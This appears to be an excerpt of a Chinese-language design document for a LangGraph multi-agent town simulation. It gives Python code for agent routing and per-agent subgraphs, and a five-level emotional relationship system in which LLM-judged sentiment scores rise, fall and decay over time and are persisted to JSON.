    """创建小镇总编排图"""

    # 构建 Agent 子图映射
    agent_graphs = {agent.agent_id: agent.graph for agent in agents}

    graph = StateGraph(TownState)

    # 添加节点
    graph.add_node("dispatch", dispatch_node)
    for agent in agents:
        graph.add_node(
            f"agent_{agent.agent_id}",
            agent.graph  # 嵌入 Agent 子图
        )

    # 添加边
    graph.add_edge(START, "dispatch")

    # dispatch → 各 Agent (条件边)
    graph.add_conditional_edges(
        "dispatch",
        route_to_agent,
        {
            agent.agent_id: f"agent_{agent.agent_id}"
            for agent in agents
        }
    )

    # 各 Agent → 路由判断 → END 或继续
    for agent in agents:
        graph.add_conditional_edges(
            f"agent_{agent.agent_id}",
            should_continue,
            {
                "continue": "dispatch",  # 需要 Agent 间协作
                "end": END
            }
        )

    return graph.compile()


def route_to_agent(state: TownState) -> str:
    """路由: 根据用户意图分发到对应 Agent"""
    # 由 dispatch_node 设置 active_agent_id
    return state["active_agent_id"]


def should_continue(state: TownState) -> str:
    """判断是否需要继续路由到其他 Agent"""
    if state.get("inter_agent_messages"):
        return "continue"
    return "end"
```

### 10.2 Agent 子图

```python
# graph/agent_graph.py

from langgraph.graph import StateGraph, START, END
from graph.nodes.conversation_compress_node import compress_conversation
from graph.nodes.memory_query_node import query_memory
from graph.nodes.skill_invoke_node import match_and_invoke_skill
from graph.nodes.mcp_load_node import load_required_mcps


def create_agent_graph(agent: BaseAgent) -> StateGraph:
    """创建单个 Agent 的对话子图"""

    graph = StateGraph(AgentState)

    # 添加节点
    graph.add_node("load_profile", load_profile_node(agent))
    graph.add_node("check_compress", check_compress_node)
    graph.add_node("compress", compress_conversation)
    graph.add_node("query_memory", query_memory(agent))
    graph.add_node("skill_match", match_and_invoke_skill(agent))
    graph.add_node("load_mcp", load_required_mcps(agent))
    graph.add_node("invoke_llm", invoke_llm_node(agent))
    graph.add_node("save_memory", save_memory_node(agent))

    # 构建边
    graph.add_edge(START, "load_profile")
    graph.add_edge("load_profile", "check_compress")

    # 压缩条件边
    graph.add_conditional_edges(
        "check_compress",
        lambda s: "compress" if s.get("_should_compress") else "query_memory",
        {"compress": "compress", "query_memory": "query_memory"}
    )

    graph.add_edge("compress", "query_memory")
    graph.add_edge("query_memory", "skill_match")

    # MCP 加载条件边
    graph.add_conditional_edges(
        "skill_match",
        lambda s: "load_mcp" if s.get("_need_mcp") else "invoke_llm",
        {"load_mcp": "load_mcp", "invoke_llm": "invoke_llm"}
    )

    graph.add_edge("load_mcp", "invoke_llm")
    graph.add_edge("invoke_llm", "save_memory")
    graph.add_edge("save_memory", END)

    return graph.compile()
```

## 十五、五级情感关系系统

### 15.1 设计目标

Agent 之间的关系不再是静态的"陌生人/熟人"，而是会随每一次互动**动态演变**的五级情感阶梯。情感等级直接影响 Agent 的：

- **称呼方式**（从尊称到昵称）
- **对话风格**（从客气到随意）
- **话题深度**（从寒暄到交心）
- **帮助意愿**（从礼貌推辞到主动帮忙）
- **记忆权重**（情感越高，相关记忆重要性越高）

### 15.2 五级情感阶梯

```
情感值:  0─────────20─────────40─────────60─────────80────────100
          │          │          │          │          │          │
     ┌────┴────┐┌────┴────┐┌────┴────┐┌────┴────┐┌────┴────┐
     │ Lv.1    ││ Lv.2    ││ Lv.3    ││ Lv.4    ││ Lv.5    │
     │ 陌生人  ││ 泛泛之交││ 朋友    ││ 好友    ││ 挚友    │
     │ 0~20    ││ 20~40   ││ 40~60   ││ 60~80   ││ 80~100  │
     └─────────┘└─────────┘└─────────┘└─────────┘└─────────┘

     ↑ 负面互动降低          ↓ 正面互动提升
     (争吵、冷漠、欺骗...)     (帮助、倾听、共鸣、共同经历...)
```

**各等级详细定义：**

| 等级 | 名称 | 情感值区间 | 关系描述 | 称呼方式 | 对话特征 |
|------|------|-----------|---------|---------|---------|
| Lv.1 | 陌生人 | 0~20 | 初次见面，没有交集 | 尊称/全名 | 礼貌客套，话题浅表，不主动分享 |
| Lv.2 | 泛泛之交 | 20~40 | 认识但不太熟 | 姓+称呼 | 友好但保持距离，偶尔闲聊 |
| Lv.3 | 朋友 | 40~60 | 有一定了解和信任 | 名字 | 愿意分享日常，互相帮助，话题深入 |
| Lv.4 | 好友 | 60~80 | 关系密切，经常互动 | 昵称/名字 | 开玩笑、吐槽、分享秘密、主动关心 |
| Lv.5 | 挚友 | 80~100 | 深度信任，互相依赖 | 专属昵称 | 无话不谈，坦诚相待，遇事第一时间想到对方 |

> **注意：** 情感值也可以跌破 0（-20 为下限），进入"厌恶"区域。低于 -10 的关系，Agent 会主动回避互动。

```python
# emotion/emotion_engine.py

from enum import IntEnum
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional


class EmotionLevel(IntEnum):
    """五级情感枚举"""
    STRANGER = 1       # 陌生人
    ACQUAINTANCE = 2   # 泛泛之交
    FRIEND = 3         # 朋友
    CLOSE_FRIEND = 4   # 好友
    BEST_FRIEND = 5    # 挚友

    # 负面区域
    DISLIKE = -1       # 厌恶


@dataclass
class InteractionRecord:
    """单次互动记录"""
    timestamp: datetime
    sentiment: str         # "positive" / "negative" / "neutral"
    sentiment_score: float # -1.0 ~ 1.0
    delta: float           # 情感值变化量 (+N 或 -N)
    emotion_before: int    # 互动前情感值
    emotion_after: int     # 互动后情感值
    summary: str           # 本次互动摘要
    topics: list[str]      # 讨论的话题


@dataclass
class RelationshipState:
    """两人之间的关系状态"""
    agent_a: str               # Agent A 的 ID
    agent_b: str               # Agent B 的 ID
    score: float = 10.0        # 情感值 (0-100, 可跌破0到-20)
    level: EmotionLevel = EmotionLevel.STRANGER
    interaction_count: int = 0  # 总互动次数
    first_met: Optional[datetime] = None
    last_interaction: Optional[datetime] = None
    history: list[InteractionRecord] = field(default_factory=list)

    # 个性化称呼 (可随关系演化自动生成或手动设置)
    nickname_a_to_b: str = ""  # A 对 B 的称呼
    nickname_b_to_a: str = ""  # B 对 A 的称呼

    def update_level(self):
        """根据分数重新计算等级"""
        if self.score < -10:
            self.level = EmotionLevel.DISLIKE
        elif self.score < 20:
            self.level = EmotionLevel.STRANGER
        elif self.score < 40:
            self.level = EmotionLevel.ACQUAINTANCE
        elif self.score < 60:
            self.level = EmotionLevel.FRIEND
        elif self.score < 80:
            self.level = EmotionLevel.CLOSE_FRIEND
        else:
            self.level = EmotionLevel.BEST_FRIEND

    @property
    def level_changed(self) -> bool:
        """最近一次更新是否导致等级变化"""
        if not self.history:
            return False
        last = self.history[-1]
        old_level = EmotionLevel.STRANGER  # 根据 emotion_before 算
        if last.emotion_before < -10:
            old_level = EmotionLevel.DISLIKE
        elif last.emotion_before < 20:
            old_level = EmotionLevel.STRANGER
        elif last.emotion_before < 40:
            old_level = EmotionLevel.ACQUAINTANCE
        elif last.emotion_before < 60:
            old_level = EmotionLevel.FRIEND
        elif last.emotion_before < 80:
            old_level = EmotionLevel.CLOSE_FRIEND
        else:
            old_level = EmotionLevel.BEST_FRIEND
        return old_level != self.level
```

### 15.5 情感值计算器

```python
# emotion/emotion_calculator.py

class EmotionCalculator:
    """情感值计算器 — 每轮对话结束后计算情感变化"""

    # 基础变化量 (根据情感倾向)
    BASE_DELTA = {
        "very_positive": +8,   # 高度正面: 深度共鸣、提供重要帮助
        "positive":      +5,   # 正面: 愉快对话、互相帮助
        "slight_positive": +3, # 微正面: 礼貌友好、正常交流
        "neutral":       +1,   # 中性: 无特别情感波动
        "slight_negative": -3, # 微负面: 轻微分歧、话题不合
        "negative":      -6,   # 负面: 争吵、冷漠、敷衍
        "very_negative": -10,  # 高度负面: 严重冲突、欺骗、背叛
    }

    # 阶梯门槛: 越高的等级需要越多的正面积累才能升级
    LEVEL_THRESHOLDS = {
        (EmotionLevel.STRANGER, EmotionLevel.ACQUAINTANCE): 20,
        (EmotionLevel.ACQUAINTANCE, EmotionLevel.FRIEND): 40,
        (EmotionLevel.FRIEND, EmotionLevel.CLOSE_FRIEND): 60,
        (EmotionLevel.CLOSE_FRIEND, EmotionLevel.BEST_FRIEND): 80,
    }

    # 衰减机制: 长时间不互动，情感缓慢下降
    DECAY_RATE = 0.5          # 每天衰减量
    MAX_DECAY_DAYS = 30       # 最多衰减天数

    async def evaluate_interaction(
        self,
        conversation: list[dict],
        llm
    ) -> dict:
        """
        用 LLM 评估本轮对话的情感倾向

        Args:
            conversation: 本轮对话记录 [{role, content}, ...]
            llm: LLM 实例

        Returns:
            {"sentiment": str, "score": float, "reason": str}
        """
        dialogue_text = "\n".join(
            f"{'用户' if m['role'] == 'human' else 'Agent'}: {m['content']}"
            for m in conversation
        )

        prompt = f"""分析以下两人之间的对话，评估情感倾向。

对话内容:
{dialogue_text}

请从以下维度评估:
1. 情感基调: 对话整体是正面、负面还是中性？
2. 互动质量: 是否有深度交流、互相帮助、共鸣？
3. 态度表现: 是否真诚、耐心、尊重？

输出 JSON 格式:
{{
  "sentiment": "very_positive/positive/slight_positive/neutral/slight_negative/negative/very_negative",
  "score": <浮点数 -1.0 到 1.0>,
  "reason": "<一句话说明理由>"
}}"""

        response = await llm.ainvoke(prompt)
        try:
            import json
            result = json.loads(response.content.strip())
            return result
        except (json.JSONDecodeError, ValueError):
            return {
                "sentiment": "neutral",
                "score": 0.0,
                "reason": "评估失败，默认中性"
            }

    def calculate_delta(
        self,
        sentiment: str,
        current_score: float,
        interaction_count: int
    ) -> float:
        """
        计算情感值变化量

        策略:
        1. 基础 delta 由情感倾向决定
        2. 越高的等级，升级越慢 (成长曲线递减)
        3. 互动次数越多，单次影响越小 (边际递减)
        """
        base = self.BASE_DELTA.get(sentiment, 0)

        # 边际递减: 互动超过10次后，单次影响逐渐减弱
        if interaction_count > 10:
            decay_factor = 1.0 / (1.0 + 0.03 * (interaction_count - 10))
            base *= decay_factor

        # 高等级减速: 分数越接近下一等级门槛，增长越慢
        if current_score > 40:
            slow_factor = 0.8  # 朋友以上，增长减速20%
            if current_score > 60:
                slow_factor = 0.6  # 好友以上，减速40%
            if sentiment in ("positive", "very_positive"):
                base *= slow_factor

        # 负面情感不做减速 (避免关系破裂太慢)
        # 但设置单次下降上限，防止一次争吵直接从挚友变陌生人
        if base < 0:
            base = max(base, -15)

        return round(base, 1)

    def apply_time_decay(self, relationship: "RelationshipState"):
        """
        时间衰减: 长时间不互动，情感缓慢下降

        模拟现实: 再好的朋友不联系也会渐渐疏远
        """
        if relationship.last_interaction is None:
            return

        days_elapsed = (
            datetime.now() - relationship.last_interaction
        ).days

        if days_elapsed > 7:  # 超过7天开始衰减
            effective_days = min(days_elapsed - 7, self.MAX_DECAY_DAYS)
            decay = effective_days * self.DECAY_RATE
            relationship.score = max(
                relationship.score - decay, -20  # 下限 -20
            )
            relationship.update_level()
```

### 15.6 关系持久化存储

```python
# emotion/relationship_store.py

import json
from pathlib import Path


class RelationshipStore:
    """Agent 间关系持久化存储"""

    def __init__(self, persist_dir: str = "./data/relationships"):
        self.persist_dir = Path(persist_dir)
        self.persist_dir.mkdir(parents=True, exist_ok=True)
        # 内存缓存: {(agent_a, agent_b): RelationshipState}
        self._cache: dict[tuple[str, str], RelationshipState] = {}

    def _sort_key(self, a: str, b: str) -> tuple[str, str]:
        """统一排序，确保 (A,B) 和 (B,A) 指向同一条关系"""
        return (min(a, b), max(a, b))

    def get_relationship(
        self, agent_a: str, agent_b: str
    ) -> "RelationshipState":
        """获取两人关系 (不存在则创建)"""
        key = self._sort_key(agent_a, agent_b)

        if key not in self._cache:
            # 尝试从文件加载
            filepath = self._filepath(key)
            if filepath.exists():
                self._cache[key] = self._load(filepath, agent_a, agent_b)
            else:
                from emotion.emotion_engine import RelationshipState
                self._cache[key] = RelationshipState(
                    agent_a=agent_a, agent_b=agent_b
                )

        return self._cache[key]

    def save_relationship(self, relationship: "RelationshipState"):
        """保存关系到文件"""
        key = self._sort_key(relationship.agent_a, relationship.agent_b)
        self._cache[key] = relationship
        self._save(self._filepath(key), relationship)

    def get_all_relationships(self, agent_id: str) -> list["RelationshipState"]:
        """获取某 Agent 的所有关系"""
        results = []
        for key, rel in self._cache.items():
            if agent_id in key:
                results.append(rel)
        return sorted(results, key=lambda r: r.score, reverse=True)

    def _filepath(self, key: tuple[str, str]) -> Path:
        return self.persist_dir / f"rel_{key[0]}_{key[1]}.json"

    def _save(self, path: Path, rel: "RelationshipState"):
        """序列化到 JSON"""
        data = {
            "agent_a": rel.agent_a,
            "agent_b": rel.agent_b,
            "score": rel.score,
            "level": rel.level.value,
            "interaction_count": rel.interaction_count,
            "first_met": rel.first_met.isoformat() if rel.first_met else None,
            "last_interaction": rel.last_interaction.isoformat() if rel.last_interaction else None,
            "nickname_a_to_b": rel.nickname_a_to_b,
            "nickname_b_to_a": rel.nickname_b_to_a,
            "history": [
                {
                    "timestamp": h.timestamp.isoformat(),
                    "sentiment": h.sentiment,
                    "sentiment_score": h.sentiment_score,
                    "delta": h.delta,
                    "emotion_before": h.emotion_before,
                    "emotion_after": h.emotion_after,
                    "summary": h.summary,
                    "topics": h.topics,
                }
                for h in rel.history[-50:]  # 只保留最近50条记录
            ]
        }
        path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')

    def _load(self, path: Path, agent_a: str, agent_b: str) -> "RelationshipState":
        """从 JSON 反序列化"""
        from emotion.emotion_engine import RelationshipState, InteractionRecord, EmotionLevel
        data = json.loads(path.read_text(encoding='utf-8'))

        rel = RelationshipState(
            agent_a=agent_a,
            agent_b=agent_b,
            score=data["score"],
            level=EmotionLevel(data["level"]),
            interaction_count=data["interaction_count"],
            first_met=datetime.fromisoformat(data["first_met"]) if data["first_met"] else None,
            last_interaction=datetime.fromisoformat(data["last_interaction"]) if data["last_interaction"] else None,
            nickname_a_to_b=data.get("nickname_a_to_b", ""),
            nickname_b_to_a=data.get("nickname_b_to_a", ""),
        )

        for h in data.get("history", []):
            rel.history.append(InteractionRecord(
                timestamp=datetime.fromisoformat(h["timestamp"]),
                sentiment=h["sentiment"],
                sentiment_score=h["sentiment_score"],
                delta=h["delta"],
                emotion_before=h["emotion_before"],
                emotion_after=h["emotion_after"],
                summary=h["summary"],
                topics=h.get("topics", []),
            ))

        rel.update_level()
        return rel
```

### 15.8 情感评估节点（LangGraph Node）

```python
# graph/nodes/emotion_evaluate_node.py

from datetime import datetime


async def evaluate_emotion_node(state: AgentState, config: dict) -> dict:
    """
    情感评估节点:
    在每次对话结束后，评估本次互动对关系的影响

    在 Agent 子图中，位于 save_memory_node 之后
    """
    emotion_engine = config["configurable"]["emotion_engine"]
    calculator = config["configurable"]["emotion_calculator"]
    llm = config["configurable"]["llm"]
    store = config["configurable"]["relationship_store"]

    my_id = state["agent_id"]
    partner_id = state.get("conversation_partner_id")
    messages = state["messages"]

    if not partner_id:
        return {}  # 没有特定对话对象，跳过

    # 1. 获取关系
    relationship = store.get_relationship(my_id, partner_id)

    # 2. 提取本轮对话 (最后2条: 用户+Agent)
    current_turn = messages[-2:] if len(messages) >= 2 else messages

    # 3. LLM 评估情感倾向
    evaluation = await calculator.evaluate_interaction(
        conversation=[{"role": m.type, "content": m.content} for m in current_turn],
        llm=llm
    )

    # 4. 计算情感值变化
    delta = calculator.calculate_delta(
        sentiment=evaluation["sentiment"],
        current_score=relationship.score,
        interaction_count=relationship.interaction_count
    )

    # 5. 更新关系状态
    old_score = relationship.score
    old_level = relationship.level

    relationship.score = max(-20, min(100, relationship.score + delta))
    relationship.interaction_count += 1
    relationship.last_interaction = datetime.now()
    if relationship.first_met is None:
        relationship.first_met = datetime.now()

    # 记录互动
    relationship.history.append(InteractionRecord(
        timestamp=datetime.now(),
        sentiment=evaluation["sentiment"],
        sentiment_score=evaluation["score"],
        delta=delta,
        emotion_before=old_score,
        emotion_after=relationship.score,
        summary=evaluation.get("reason", ""),
        topics=[]  # 可选: 由 LLM 提取话题标签
    ))

    relationship.update_level()
    store.save_relationship(relationship)

    # 6. 检测等级变化 → 写入长期记忆
    if relationship.level != old_level:
        level_names = {
            1: "陌生人", 2: "泛泛之交", 3: "朋友",
            4: "好友", 5: "挚友", -1: "厌恶"
        }
        old_name = level_names.get(old_level.value, "未知")
        new_name = level_names.get(relationship.level.value, "未知")

        # 升级/降级事件写入长期记忆
        if relationship.level.value > old_level.value:
            memory_content = (
                f"与{partner_id}的关系从【{old_name}】升级为"
                f"【{new_name}】! 当前情感值: {relationship.score:.1f}"
            )
        else:
            memory_content = (
                f"与{partner_id}的关系从【{old_name}】降级为"
                f"【{new_name}】。当前情感值: {relationship.score:.1f}"
            )

        # 写入长期记忆 (高重要性)
        await config["configurable"]["memory_manager"].ltm.save_memory(
            agent_id=my_id,
            content=memory_content,
            importance=0.9,
            emotion="happy" if relationship.level.value > old_level.value else "sad",
            metadata={"type": "relationship_change", "partner": partner_id}
        )

    return {}  # 情感更新已在 store 中完成
```

### 15.12 情感系统的关键设计原则

| 原则 | 实现 |
|------|------|
| **慢升快降** | 升级需要持续正面互动积累，但几次争吵就可能降级 |
| **边际递减** | 同等质量的互动，在关系越深时影响越小 (第100次互动不如第1次印象深刻) |
| **时间衰减** | 超过 7 天不互动开始衰减，防止关系"冻结"在不合理的状态 |
| **等级门槛** | 五级阶梯有明确的分数门槛，升级/降级触发事件写入长期记忆 |
| **不可跨级** | 单次互动最多升降 1 级，不会从陌生人直接跳到好友 |
| **负面下限** | 最低到 -20（厌恶），不会无限下降 |
| **上下文感知** | 对话风格由关系等级实时决定，同一对 Agent 在不同阶段表现截然不同 |
